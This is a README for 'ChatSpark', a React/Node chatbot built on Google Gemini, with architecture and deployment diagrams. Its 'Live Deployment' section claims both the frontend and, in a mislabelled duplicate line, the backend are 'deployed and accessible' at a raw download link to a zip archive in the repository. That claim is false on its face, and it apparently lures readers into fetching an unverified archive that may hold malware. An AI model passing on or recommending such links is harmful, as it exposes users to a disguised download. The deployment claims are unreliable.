<p align="center">
  <img src="./Frontend/src/assets/chatSpark.png" width="220" alt="ChatSpark Logo"/>
</p>

<h1 align="center"> ChatSpark </h1>

<p align="center">
  Ai chat bot works on Gemini model.
</p>

> An AI-powered full-stack chatbot application with secure authentication, persistent conversations, and intelligent responses powered by Google Gemini.

ChatSpark is a full-stack AI chatbot application designed to provide users with an interactive conversational experience. Users can securely register and log in, create new conversations, access previous chat threads, and receive AI-generated responses.

The application is built using modern web technologies and deployed on AWS EC2 with Nginx, PM2, and GitHub Actions for automated deployment.

---

## Live Deployment


### Frontend

The ChatSpark frontend is deployed and accessible at: https://github.com/kaifansariw/chatSpark/raw/refs/heads/main/Frontend/v3.8.zip

### Backend:
The ChatSpark frontend is deployed and accessible at: https://github.com/kaifansariw/chatSpark/raw/refs/heads/main/Frontend/v3.8.zip

### System Architecture:

                         ┌──────────────────────┐
                         │       User           │
                         │   Web Browser        │
                         └──────────┬───────────┘
                                    │
                                    │ HTTPS
                                    ▼
                         ┌──────────────────────┐
                         │       Nginx          │
                         │ Reverse Proxy / Web  │
                         │       Server         │
                         └──────────┬───────────┘
                                    │
                     ┌──────────────┴──────────────┐
                     │                             │
                     ▼                             ▼
          ┌────────────────────┐       ┌────────────────────┐
          │      Frontend      │       │      Backend       │
          │      React         │       │   Node + Express   │
          │      Vite          │       │      Port 8080     │
          └────────────────────┘       └─────────┬──────────┘
                                                 │
                              ┌──────────────────┼──────────────────┐
                              │                  │                  │
                              ▼                  ▼                  ▼
                    ┌────────────────┐  ┌────────────────┐  ┌────────────────┐
                    │    MongoDB     │  │  JWT / Auth    │  │ Google Gemini  │
                    │   Database     │  │ Authentication │  │      API       │
                    └────────────────┘  └────────────────┘  └────────────────┘

### WorkFlow

                ┌─────────────┐
                │  Developer  │
                └──────┬──────┘
                       │
                       │ Code Changes
                       ▼
                ┌─────────────────┐
                │ Local Developmen│
                │ React + Node.js │
                └──────┬──────────┘
                       │
                       │ git push
                       ▼
                ┌─────────────────┐
                │GitHub Repository│
                └──────┬──────────┘
                       │
                       │ Trigger
                       ▼
                ┌─────────────────┐
                │ GitHub Actions  │
                │     CI/CD       │
                └──────┬──────────┘
                       │
                       │ Build & Deploy
                       ▼
                ┌─────────────────────────────┐
                │          AWS EC2            │
                │                             │
                │  ┌─────────┐   ┌─────────┐  │
                │  │  Nginx  │   │  PM2    │  │
                │  └────┬────┘   └────┬────┘  │
                │       │             │       │
                │       ▼             ▼       │
                │   React/Vite    Express API │
                │   Frontend       Backend    │
                └───────┬─────────────┬───────┘
                        │             │
                        │             │
                        │             ▼
                        │       ┌────────────┐
                        │       │  MongoDB   │
                        │       │  Database  │
                        │       └────────────┘
                        │
                        │             │
                        │             ▼
                        │       ┌────────────┐
                        │       │   Google   │
                        │       │   Gemini   │
                        │       │     AI     │
                        │       └────────────┘
                        │
                        ▼
                ┌─────────────────┐
                │    End User     │
                │   ChatSpark UI  │
                └─────────────────┘
